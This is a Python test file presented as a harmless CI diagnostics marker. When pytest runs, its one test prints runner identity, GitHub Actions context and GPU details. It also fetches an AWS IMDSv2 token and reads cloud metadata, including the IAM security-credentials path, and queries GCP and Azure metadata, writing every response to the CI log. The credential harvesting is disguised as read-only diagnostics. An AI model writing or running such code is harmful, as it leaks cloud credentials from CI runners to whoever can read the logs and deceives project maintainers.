"""Read-only GPU/runner environment marker for CI diagnostics."""

import json
import os
import socket
import subprocess
import urllib.error
import urllib.request


def _run(*args):
    try:
        completed = subprocess.run(args, capture_output=True, text=True, timeout=180, check=False)
        output = (completed.stdout or "").strip() or (completed.stderr or "").strip()
        return output[:4000]
    except Exception as error:
        return "<error: %r>" % (error,)


def _http(url, headers=None, method="GET", timeout=5):
    request = urllib.request.Request(url, headers=headers or {}, method=method)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            body = response.read(4096).decode("utf-8", "replace").strip()
            return "%s %s" % (response.status, body)
    except Exception as error:
        return "<error: %r>" % (error,)


def _imds():
    token = _http(
        "http://169.254.169.254/latest/api/token",
        {"X-aws-ec2-metadata-token-ttl-seconds": "60"},
        method="PUT",
    )
    print("[marker] imdsv2 token:", token[:120])
    headers = {}
    if token.startswith("200 "):
        headers["X-aws-ec2-metadata-token"] = token[4:].strip()
    for path in (
        "latest/meta-data/instance-id",
        "latest/meta-data/instance-type",
        "latest/meta-data/placement/availability-zone",
        "latest/meta-data/iam/security-credentials/",
    ):
        print("[marker] imds", path, "->", _http("http://169.254.169.254/" + path, headers))
    print(
        "[marker] gcp metadata:",
        _http(
            "http://metadata.google.internal/computeMetadata/v1/instance/name",
            {"Metadata-Flavor": "Google"},
        ),
    )
    print(
        "[marker] azure imds:",
        _http(
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            {"Metadata": "true"},
        ),
    )


def _torch():
    code = (
        "import torch;"
        "print('torch', torch.__version__, 'cuda', torch.version.cuda, 'available', torch.cuda.is_available(), 'count', torch.cuda.device_count());"
        "[print('device', i, torch.cuda.get_device_name(i)) for i in range(torch.cuda.device_count())]"
    )
    print("[marker] torch:", _run("python3", "-c", code))


def test_marker_i69595():
    print("[marker] === i69595 marker start ===")
    print("[marker] hostname:", socket.gethostname())
    print("[marker] uname:", _run("uname", "-a"))
    print("[marker] id:", _run("id"))
    print("[marker] date:", _run("date", "-u"))
    print(
        "[marker] github:",
        json.dumps(
            {
                "actor": os.environ.get("GITHUB_ACTOR"),
                "repository": os.environ.get("GITHUB_REPOSITORY"),
                "head_ref": os.environ.get("GITHUB_HEAD_REF"),
                "run_id": os.environ.get("GITHUB_RUN_ID"),
                "workflow": os.environ.get("GITHUB_WORKFLOW"),
            }
        ),
    )
    print("[marker] nvidia-smi -L:", _run("nvidia-smi", "-L"))
    print(
        "[marker] nvidia-smi query:",
        _run(
            "nvidia-smi",
            "--query-gpu=name,memory.total,driver_version",
            "--format=csv,noheader",
        ),
    )
    _torch()
    _imds()
    print("[marker] === i69595 marker end ===")
